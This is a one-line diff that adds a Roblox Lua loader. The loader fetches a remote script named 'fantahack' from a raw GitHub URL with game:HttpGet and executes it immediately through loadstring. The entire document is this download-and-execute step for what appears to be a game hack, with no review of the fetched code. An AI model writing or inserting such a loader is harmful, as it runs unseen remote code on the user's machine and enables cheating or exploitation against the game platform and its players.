@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/p0nci/_/refs/heads/main/fantahack"))()
